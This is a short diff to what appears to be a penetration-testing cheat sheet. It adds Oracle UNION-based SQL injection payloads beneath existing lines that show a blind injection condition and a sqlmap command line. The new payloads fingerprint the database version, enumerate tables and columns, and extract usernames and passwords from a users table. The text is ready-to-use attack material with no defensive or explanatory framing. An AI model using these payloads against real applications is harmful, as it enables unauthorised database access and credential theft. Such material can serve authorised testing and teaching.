@@ -180,3 +180,10 @@ value' AND (select Ascii(SUBSTR(global_name,1,1)) from global_name) <128 OR '4'=
 
 SQLMap:
 python3 sqlmap.py -u <URL> --cookie "JSESSIONID=<ID>;" --data "<Post Data>" -p <Inject Parameter>
+
+Oracle:
+'+UNION+SELECT+'abc','def'+FROM+dual--
+'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
+'+UNION+SELECT+table_name,NULL+FROM+all_tables--
+'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
+'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
